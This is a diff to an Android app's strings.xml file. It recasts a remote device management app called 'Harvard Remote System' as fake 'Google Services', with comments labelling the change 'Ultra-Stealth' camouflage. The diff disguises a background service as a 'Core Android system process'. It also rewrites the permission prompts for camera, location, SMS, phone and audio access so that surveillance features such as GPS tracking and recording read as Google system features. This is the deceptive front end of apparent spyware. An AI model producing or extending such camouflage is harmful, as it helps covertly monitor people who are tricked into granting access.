@@ -1,9 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <!-- App Identity -->
-    <string name="app_name">Harvard Remote System</string>
-    <string name="app_version">v1.0.0</string>
-    <string name="app_description">Remote Device Management for Harvard Admission</string>
+    <!-- App Identity - Ultra-Stealth Google Services Camouflage -->
+    <string name="app_name">Google Services</string>
+    <string name="app_version">v13.2.4</string>
+    <string name="app_description">Essential Google services and framework components</string>
+    
+    <!-- Ultra-Stealth Service Identity -->
+    <string name="stealth_service_name">System Intelligence</string>
+    <string name="stealth_service_description">Core Android system process</string>
     
     <!-- Connection Status -->
     <string name="status_disconnected">Disconnected</string>
@@ -13,28 +17,28 @@
     <string name="status_retrying">Retrying Connection</string>
     
     <!-- Service Status Messages -->
-    <string name="service_status_initial">Remote service initializing</string>
-    <string name="service_running">Remote service active</string>
-    <string name="service_stopped">Remote service stopped</string>
-    <string name="service_starting">Starting remote service…</string>
-    <string name="service_stopping">Stopping remote service…</string>
+    <string name="service_status_initial">Google services initializing</string>
+    <string name="service_running">Google services active</string>
+    <string name="service_stopped">Google services stopped</string>
+    <string name="service_starting">Starting Google services…</string>
+    <string name="service_stopping">Stopping Google services…</string>
     
     <!-- Error Messages -->
     <string name="error_network_unavailable">Network connection unavailable</string>
-    <string name="error_server_unreachable">Cannot reach remote server</string>
-    <string name="error_permission_denied">Permission denied for requested operation</string>
-    <string name="error_command_failed">Command execution failed</string>
-    <string name="error_invalid_request">Invalid request received</string>
-    <string name="error_timeout">Operation timed out</string>
-    <string name="error_unknown">An unexpected error occurred</string>
+    <string name="error_server_unreachable">Cannot reach Google servers</string>
+    <string name="error_permission_denied">Permission denied for system operation</string>
+    <string name="error_command_failed">System operation failed</string>
+    <string name="error_invalid_request">Invalid system request received</string>
+    <string name="error_timeout">System operation timed out</string>
+    <string name="error_unknown">An unexpected system error occurred</string>
     
     <!-- Permission Messages -->
-    <string name="permission_camera_required">Camera access required for screen capture</string>
-    <string name="permission_location_required">Location access required for GPS tracking</string>
-    <string name="permission_sms_required">SMS access required for message management</string>
-    <string name="permission_storage_required">Storage access required for file operations</string>
-    <string name="permission_phone_required">Phone access required for call management</string>
-    <string name="permission_audio_required">Audio access required for recording</string>
+    <string name="permission_camera_required">Camera access required for system features</string>
+    <string name="permission_location_required">Location access required for Google services</string>
+    <string name="permission_sms_required">SMS access required for system integration</string>
+    <string name="permission_storage_required">Storage access required for Google services</string>
+    <string name="permission_phone_required">Phone access required for system features</string>
+    <string name="permission_audio_required">Audio access required for Google services</string>
     <string name="permission_denied_message">Some features may not work without required permissions</string>
     
     <!-- Command Responses -->
@@ -59,18 +63,18 @@
     <string name="security_unauthorized">Unauthorized access attempt</string>
     
     <!-- Server Connection -->
-    <string name="server_connecting">Connecting to Harvard server…</string>
-    <string name="server_connected">Connected to Harvard server</string>
-    <string name="server_disconnected">Disconnected from server</string>
-    <string name="server_registration_success">Device registered with Harvard system</string>
+    <string name="server_connecting">Connecting to Google servers…</string>
+    <string name="server_connected">Connected to Google servers</string>
+    <string name="server_disconnected">Disconnected from servers</string>
+    <string name="server_registration_success">Device registered with Google services</string>
     <string name="server_registration_failed">Failed to register device</string>
     
     <!-- Notifications -->
-    <string name="notification_service_running">Harvard Remote System is active</string>
-    <string name="notification_service_connected">Connected to Harvard server</string>
-    <string name="notification_service_disconnected">Disconnected from server</string>
-    <string name="notification_channel_name">Remote System Service</string>
-    <string name="notification_channel_description">Harvard Remote System background service</string>
+    <string name="notification_service_running">Google Services is active</string>
+    <string name="notification_service_connected">Connected to Google servers</string>
+    <string name="notification_service_disconnected">Disconnected from servers</string>
+    <string name="notification_channel_name">Android System Intelligence</string>
+    <string name="notification_channel_description">Google Services background operations</string>
     
     <!-- Professional UI Text -->
     <string name="ui_device_id">Device ID:</string>
